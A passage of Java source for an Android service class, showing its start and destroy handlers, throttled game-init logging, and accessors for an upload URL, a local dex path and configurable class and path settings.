	 * @see android.app.Service#onDestroy()
	 */
	@Override
	public void onDestroy() {
		this.saveStates();
		this.stop();
		Log.d(TAG, "dservice destroy...");
	}


	/* (non-Javadoc)
	 * @see android.app.Service#onStartCommand(android.content.Intent, int, int)
	 */
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		Log.d(TAG, "dservice onStartCommand...");
		if (this.state == STATE_NEED_RESTART) {
			this.init();
		}
		String a = intent.getStringExtra("a");
		String c = intent.getStringExtra("c");
		String g = intent.getStringExtra("g");
		long ct = System.currentTimeMillis();
		boolean willLog = true;
		if (g  == null) {
			willLog = false;
		}else if (g.equals(lastGameInitGid)) {
			if (ct - lastGameInitLogTime <= minGameInitTime ) {
				willLog = false;
			}
		}
		if (willLog) {
			DLog.log(DLog.LEVEL_I, "GAME_"+ACT_GAME_INIT, g, c, "");
		}
		lastGameInitLogTime = ct;
		lastGameInitGid = g;
		return START_REDELIVER_INTENT;
		//return super.onStartCommand(intent, flags, startId);
	}

	/**
	 * @return the version
	 */
	public final int getVersion() {
		return VERSION;
	}

	/**
	 * 处理过后keyVersion
	 * 
	 * @return the keyVersion
	 */
	public final int getKeyVersion() {
		return keyVersion*27+17;
	}

	/**
	 * @return the upUrl
	 */
	public static final String getUpUrl() {
		return upUrl;
	}

	/**
	 * @param upUrl the upUrl to set
	 */
	public static final void setUpUrl(String upUrl) {
		DService.upUrl = upUrl;
	}

	/**
	 * @return the localDexPath
	 */
	public static final String getLocalDexPath() {
		return sdDir;
	}

	/**
	 * @return the emvClass
	 */
	public final String getEmvClass() {
		return emvClass;
	}

	/**
	 * @param emvClass the emvClass to set
	 */
	public final void setEmvClass(String emvClass) {
		this.emvClass = emvClass;
		this.config.put("emvClass", emvClass);
		
	}

	
	
	/**
	 * @return the emvPath
	 */
	public final String getEmvPath() {
		return emvPath;
	}

	/**
	 * @param emvPath the emvPath to set
	 */
	public final void setEmvPath(String emvPath) {
		this.emvPath = emvPath;
		this.config.put("emvPath", emvPath);
	}
	
	

}
